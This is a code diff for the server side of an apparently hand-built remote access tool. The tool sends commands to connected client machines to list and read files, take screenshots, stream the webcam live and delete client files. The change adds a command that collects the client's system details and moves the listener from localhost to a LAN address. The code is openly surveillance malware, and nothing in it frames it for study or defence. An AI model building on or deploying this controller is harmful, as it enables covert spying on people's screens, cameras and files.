@@ -27,6 +27,7 @@ def args_parse(command_line=None):
     parser.add_argument('-k', '--kill', action='store_true', help='Kill the server and delete client files')
     parser.add_argument('-c', '--capture', action='store_true', help='Capture the webcam of the client')
     parser.add_argument('-S', '--screenshot', action='store_true', help='Take a screenshot')
+    parser.add_argument("-sys", "--system", action="store_true", help="Display system information of the client")
 
     if command_line:
         return parser.parse_args(command_line)
@@ -50,25 +51,7 @@ def command_handler_loop(server_socket):
             command_line = input("Server > ")
             args = args_parse(command_line.split())
             if args.show:
-                print("Choose a directory:")
-                print("1. Desktop")
-                print("2. Input directory")
-                print("3. Cancel")
-                choice = input("Choice > ")
-
-                if choice == '1':
-                    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-                    print("Desktop files:")
-                    show_files(desktop_path)
-                elif choice == '2':
-                    input_path = input("Input directory > ")
-                    print("Input directory files:")
-                    show_files(input_path)
-                elif choice == '3':
-                    continue
-                else:
-                    print("Invalid choice")
-                    continue
+                show_files('.')
             elif args.readfile:
                 filename = ' '.join(args.readfile)
                 read_file(filename)
@@ -78,6 +61,8 @@ def command_handler_loop(server_socket):
                 take_screenshot()
             elif args.capture:
                 receive_webcam_live()
+            elif args.system:
+                display_system_info()
         except KeyboardInterrupt:
             print("\n")
             if last_client_socket:
@@ -106,6 +91,23 @@ def show_files(path):
         last_client_socket.send(json.dumps(command).encode())
     except socket.error as e:
         print(f"Error sending show files command: {e}")
+    pass
+
+
+# Function to display the system information of the client
+def display_system_info():
+    global last_client_socket
+    if last_client_socket is None:
+        print("No client connected to display system information.")
+        return
+
+    try:
+        command = {
+            'command': 'SYSTEM'
+        }
+        last_client_socket.send(json.dumps(command).encode())
+    except socket.error as e:
+        print(f"Error sending system information command: {e}")
     pass
 
 
@@ -277,6 +279,21 @@ def handle_client(client_socket, client_address):
                         json_data = json.dumps(client_info)
                         client_socket.send(json_data.encode())
 
+                elif data_command == 'SYSTEM':
+                    system = client_info['system']
+                    node = client_info['node']
+                    release = client_info['release']
+                    version = client_info['version']
+                    machine = client_info['machine']
+                    processor = client_info['processor']
+                    print(f"System information from client {client_address}:")
+                    print(f"System: {system}")
+                    print(f"Node: {node}")
+                    print(f"Release: {release}")
+                    print(f"Version: {version}")
+                    print(f"Machine: {machine}")
+                    print(f"Processor: {processor}")
+
                 elif data_command == 'KILL':
                     stop = client_info['stop']
                     if stop:
@@ -314,7 +331,7 @@ def accept_connections(server_socket):
 # Main function
 def main():
     args = args_parse()
-    host = 'localhost'
+    host = '172.20.10.3'
     port = args.listen
     server_socket = create_server_socket(host, port)
     accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
